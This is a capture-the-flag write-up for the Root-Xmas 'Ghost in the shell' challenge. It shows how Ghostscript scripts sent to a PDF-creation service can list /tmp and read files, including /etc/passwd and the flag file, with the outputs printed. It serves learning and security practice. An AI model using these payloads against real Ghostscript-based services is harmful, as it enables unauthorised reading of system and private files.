---
layout: Post
format: chall
title: Day 17 - Ghost in the shell
date: 2024-12-22
ctf: Root-Xmas
tags: [Ghostscript, PDF]
category: [Misc]
---
# Day 17 - Ghost in the shell

<a class="back-link" href="../../">< Go back</a>

## Description

Santa noticed that there was no online PDF creation service. As he's a bit ‘old school’ he decided to create a PDF creation service based on Ghostscript. It's simple, you send him a Ghostscript script and he converts your work into a PDF!

How it works is simple:

```bash
cat hello.gs
# %!PS
# /newfont /Helvetica findfont 12 scalefont setfont
# 100 700 moveto
# (Hello, world merry Christmas) show
# showpage

cat hello.gs | socat - TCP:dyn-01.xmas.root-me.org:PORT
# Decode the base64 in PDF file and enjoy your document!
```

Your goal is to get the flag in `/tmp/flag-<RANDOM>.txt`

Author : Elweth
<https://deploy.xmas.root-me.org>

## Challenge

After looking around for how to exfiltrate and do some recon using a Ghostscript, I found [this article](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) from the [hacktricks page GhostScript Injection](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/formula-csv-doc-latex-ghostscript-injection.md).

From this we get two interesting things, how to exfiltrate data:

```bash
GS> /infile (/etc/passwd) (r) file def
GS> /buff 100 string def
GS> infile buff readstring
GS<2> stack
# true
# root:x:0:0:root:/root:/bin/bash
# bin:x:1:1:bin:/bin:/sbin/nologin
# daemon:x:2:2:daemon:/sbin:/sbin/nol
```

And how to list files in a folder:

```bash
GS> (test_directory/*) { stack pop } 4096 string filenameforall
# test_directory/interesting_folder/also_interesting_file.txt
# test_directory/interesting_file.txt
```

So we need to remember that we are most likely in `-dSAFER` mode, fortunately `/tmp` is part of the `--permit-file-*` flag.

So let's modify the payloads to find our flag:

```gs
(/tmp/*) { stack pop } 4096 string filenameforall
```

This gives us:

```bash
# GPL Ghostscript 9.53.3 (2020-10-01)
# Copyright (C) 2020 Artifex Software, Inc.  All rights reserved.
# This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
# see the file COPYING for details.
# /tmp/gs_vyLIVT
# /tmp/gs_NWnccY
# /tmp/gs_kovqcW
# /tmp/gs_5MHQhY
# /tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt
```

Now that we have the flag file let's get it:

```gs
/infile (/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt) (r) file def
/buff 100 string def
infile buff readstring
<2> stack
```

And we get the flag:

```bash
# GPL Ghostscript 9.53.3 (2020-10-01)
# Copyright (C) 2020 Artifex Software, Inc.  All rights reserved.
# This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
# see the file COPYING for details.

# false
# RM{Gh0Scr1pt_c4n_d0_THIS??}
```
